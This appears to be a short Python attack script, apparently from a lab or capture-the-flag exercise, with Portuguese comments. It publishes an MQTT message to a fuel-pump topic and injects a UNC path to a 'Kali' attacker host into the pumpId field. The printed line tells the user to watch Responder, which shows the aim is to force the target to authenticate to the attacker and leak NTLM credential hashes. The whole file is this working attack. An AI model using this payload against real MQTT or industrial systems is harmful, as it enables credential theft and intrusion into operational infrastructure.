import json
import paho.mqtt.client as mqtt

BROKER = "10.10.100.100"
KALI_IP = "10.10.100.8"

client = mqtt.Client(mqtt.CallbackAPIVersion.VERSION2)
client.connect(BROKER, 1883, 60)

# Mantendo a estrutura exata do JSON, mas alterando o valor do texto
payload = {
    "pumpId": rf"\\{KALI_IP}\share\PUMP003",
    "currentLevel": 5
}

client.publish("fuel-pumps/refill-request", json.dumps(payload))
print("[+] Teste 1 enviado. Monitore o Responder!")
client.disconnect()
